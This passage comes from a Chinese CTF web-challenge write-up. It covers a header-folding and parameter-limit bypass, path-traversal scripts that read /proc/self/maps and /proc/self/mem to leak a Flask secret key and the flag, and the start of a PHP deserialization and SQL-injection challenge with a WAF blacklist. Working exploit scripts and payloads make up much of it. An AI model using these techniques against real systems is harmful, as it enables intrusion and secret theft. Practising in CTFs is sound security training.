class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="variable">$url</span> .= <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);<span class="comment">//这里加的请求头</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure><br>为了让它通过后面的:检测分割,传入的json字符串格式应该是这样的<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;headers&quot;: [&quot;admin:true&quot;,&quot;test:truetest&quot;]&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里需要绕过两个:</p>
<ul>
<li>第一个是headers里面的admin做了检测</li>
<li>第二个是params里面加了一个<code>&amp;admin=false</code></li>
</ul>
<ul>
<li>headers的绕过利用的是header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行<br>eg<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;headers&quot;: [&quot;admin: ha&quot;,&quot; true: haha&quot;]&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>curl生成的headers<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin: ha</span><br><span class="line"> true: haha</span><br></pre></td></tr></table></figure></p>
<p>nodejs解析<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;admin&quot;: &quot;ha true haha&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从而绕过</p>
<ul>
<li>params的绕过是利用的nodejs的parameterLimit有1000的限制,可以参考:<a href="https://thunf.github.io/2017/01/20/20170120-form-keys-1000-limit/">https://thunf.github.io/2017/01/20/20170120-form-keys-1000-limit/</a> , 我们可以传入1000个参数来让后面新加的<code>&amp;admin=false</code>抛弃</li>
</ul>
<p>payload:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=<span class="string">&#x27;&#123;&quot;headers&quot;:[&quot;admin: ha&quot;,\n&quot; true: haha&quot;],&quot;params&quot;:&#123;&quot;admin&quot;:&quot;xixi&quot;,&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">1001</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;i&#125;</span>&quot;:&quot;whatever&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;i&#125;</span>&quot;:&quot;whatever&quot;,&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;\n&#125;&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20223032.png" alt="屏幕截图 2023-11-27 223032.png"></p>
<h3 id="catcat-new"><a href="#catcat-new" class="headerlink" title="catcat-new"></a>catcat-new</h3><ul>
<li>考点:任意文件读取读/proc/self/mem内存信息(secret-key,flag),通过/maps获取地址偏移<br>任意文件读取读源码../app.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line">    __name__,</span><br><span class="line">    static_url_path=<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    static_folder=<span class="string">&#x27;static&#x27;</span></span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">    flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line">    cats_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line">        cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一开始以为要爆破secret-key<br>后来发现这题的考点是通过读取<code>/proc/self/mem</code>来得到secret_key,/proc/self/mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，因此需要搭配/proc/self/maps获取堆栈分布，结合maps的映射信息来确定读的偏移值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://61.147.171.105:63921/&#x27;</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment"># 请求file路由进行读取</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    <span class="comment"># 匹配指定格式的地址</span></span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置起始和结束位置并读取/proc/self/mem</span></span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment"># 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span></span><br><span class="line">            secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> secret_key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">                s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到secret-key:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">541493e8c3a24ad4965e23027d21588c*abcdefgh</span><br></pre></td></tr></table></figure><br>伪造:<br>这里不知道为什么伪造失效了,题目环境应该出了点问题<br>还有个方法直接通过读/proc/self/mem来读flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">baseUrl = <span class="string">&quot;http://61.147.171.105:54125/info?file=../../../../..&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = baseUrl + <span class="string">&quot;/proc/self/maps&quot;</span></span><br><span class="line">    memInfoList = requests.get(url).text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line">    mem = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> memInfoList:</span><br><span class="line">        memAddress = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">        <span class="keyword">if</span> memAddress:</span><br><span class="line">            start = <span class="built_in">int</span>(memAddress.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">            end = <span class="built_in">int</span>(memAddress.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">            infoUrl = baseUrl + <span class="string">&quot;/proc/self/mem&amp;start=&quot;</span> + <span class="built_in">str</span>(start) + <span class="string">&quot;&amp;end=&quot;</span> + <span class="built_in">str</span>(end)</span><br><span class="line">            mem = requests.get(infoUrl).text</span><br><span class="line">            <span class="keyword">if</span> re.findall(<span class="string">r&quot;&#123;[\w]+&#125;&quot;</span>, mem):</span><br><span class="line">                <span class="built_in">print</span>(re.findall(<span class="string">r&quot;\w+&#123;\w+&#125;&quot;</span>, mem))</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-27%20234744.png" alt="屏幕截图 2023-11-27 234744.png"></p>
<h3 id="题目名称-warmup"><a href="#题目名称-warmup" class="headerlink" title="题目名称-warmup"></a>题目名称-warmup</h3><p>下载下来有三个php文件:<br>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;平平无奇的登陆界面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        margin: <span class="number">0</span>;</span><br><span class="line">        padding: <span class="number">0</span>;</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">        background: <span class="title function_ invoke__">url</span>(<span class="string">&quot;static/background.jpg&quot;</span>);</span><br><span class="line">        <span class="comment">/*背景图片自定义*/</span></span><br><span class="line">        background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box &#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top: <span class="number">50</span>%;</span><br><span class="line">        left: <span class="number">50</span>%;</span><br><span class="line">        transform: <span class="title function_ invoke__">translate</span>(-<span class="number">50</span>%, -<span class="number">50</span>%);</span><br><span class="line">        width: <span class="number">400</span>px;</span><br><span class="line">        padding: <span class="number">40</span>px;</span><br><span class="line">        background: <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">.8</span>);</span><br><span class="line">        box-sizing: border-box;</span><br><span class="line">        box-shadow: <span class="number">0</span> <span class="number">15</span>px <span class="number">25</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">.5</span>);</span><br><span class="line">        border-radius: <span class="number">10</span>px;</span><br><span class="line">        <span class="comment">/*登录窗口边角圆滑*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box h2 &#123;</span><br><span class="line">        margin: <span class="number">0</span> <span class="number">0</span> <span class="number">30</span>px;</span><br><span class="line">        padding: <span class="number">0</span>;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox &#123;</span><br><span class="line">        position: relative;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox input &#123;</span><br><span class="line">        width: <span class="number">100</span>%;</span><br><span class="line">        padding: <span class="number">10</span>px <span class="number">0</span>;</span><br><span class="line">        font-size: <span class="number">16</span>px;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        letter-spacing: <span class="number">1</span>px;</span><br><span class="line">        margin-bottom: <span class="number">30</span>px;</span><br><span class="line">        <span class="comment">/*输入框设置*/</span></span><br><span class="line">        border: none;</span><br><span class="line">        border-bottom: <span class="number">1</span>px solid <span class="comment">#fff;</span></span><br><span class="line">        outline: none;</span><br><span class="line">        background: transparent;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox label &#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        top: <span class="number">0</span>;</span><br><span class="line">        left: <span class="number">0</span>;</span><br><span class="line">        padding: <span class="number">10</span>px <span class="number">0</span>;</span><br><span class="line">        font-size: <span class="number">16</span>px;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        pointer-events: none;</span><br><span class="line">        transition: <span class="number">.5</span>s;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box .inputBox input:focus~label,</span><br><span class="line">    .box .inputBox input:valid~label &#123;</span><br><span class="line">        top: -<span class="number">18</span>px;</span><br><span class="line">        left: <span class="number">0</span>;</span><br><span class="line">        color: <span class="comment">#03a9f4;</span></span><br><span class="line">        font-size: <span class="number">12</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    .box input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">        background: transparent;</span><br><span class="line">        border: none;</span><br><span class="line">        outline: none;</span><br><span class="line">        color: <span class="comment">#fff;</span></span><br><span class="line">        background: <span class="comment">#03a9f4;</span></span><br><span class="line">        padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">        cursor: pointer;</span><br><span class="line">        border-radius: <span class="number">5</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">box</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;请登录&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inputBox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>=&quot;&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span>&gt;用户名&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">inputBox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">required</span>=&quot;&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span>&gt;密码&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;&quot; <span class="title">value</span>=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &#x27;<span class="title">conn</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class"><span class="title">include</span> &#x27;<span class="title">flag</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span> ($<span class="title">_COOKIE</span>[&#x27;<span class="title">last_login_info</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="variable">$last_login_info</span> = <span class="title function_ invoke__">unserialize</span> (<span class="title function_ invoke__">base64_decode</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;last_login_info&#x27;</span>]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$last_login_info</span>) &amp;&amp; <span class="variable">$last_login_info</span>[<span class="string">&#x27;ip&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;WAF info: your ip status has been changed, you are dangrous.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_encode</span> (<span class="title function_ invoke__">serialize</span> (<span class="keyword">array</span> ( <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]))) ;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span> (<span class="string">&#x27;last_login_info&#x27;</span>, <span class="variable">$cookie</span>, <span class="title function_ invoke__">time</span> () + (<span class="number">86400</span> * <span class="number">30</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">	<span class="variable">$password</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SQL</span>();</span><br><span class="line">	<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">	<span class="variable">$sql</span>-&gt;table = <span class="variable">$table</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">check_login</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>cookie的<code>last_login_info</code>字段可以传入值来反序列化</p>
<p>conn.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;database error, please check your input&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;username or password incorrect!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;welcome, admin! this is your flag -&gt; &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;welcome! but you are not admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span> (<span class="string">&quot;select username,password from &quot;</span>.<span class="variable">$this</span>-&gt;table.<span class="string">&quot; where username=&#x27;&quot;</span>.<span class="variable">$this</span>-&gt;username.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable">$blacklist</span> = [<span class="string">&quot;union&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;[&quot;</span>, <span 